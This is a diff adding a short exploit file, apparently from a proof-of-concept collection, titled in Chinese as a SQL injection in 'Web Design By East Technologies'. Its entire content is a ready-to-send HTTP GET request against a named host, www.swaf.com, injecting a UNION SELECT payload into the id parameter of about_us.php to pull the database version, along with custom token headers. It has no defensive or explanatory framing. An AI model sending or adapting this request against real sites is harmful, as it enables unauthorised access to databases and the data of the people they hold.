@@ -1,0 +1,9 @@
+# 利用【East Technologies SQL注入漏洞】-80000229
+# Title: Web Design By East Technologies - 存在SQL注入漏洞
+GET /en/about_us.php?acid=80000229&id=-17%27+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2Cversion%28%29%2C21%2C22%2C23--+&bid=hd_tag_m8mv26nz HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26nz
+RM-PRO-Token: b26c955c70ff328c57f40c059c1be88b
+RM-PRO-Time: 1742808642881
+User-Agent: curl/7.83.1
+
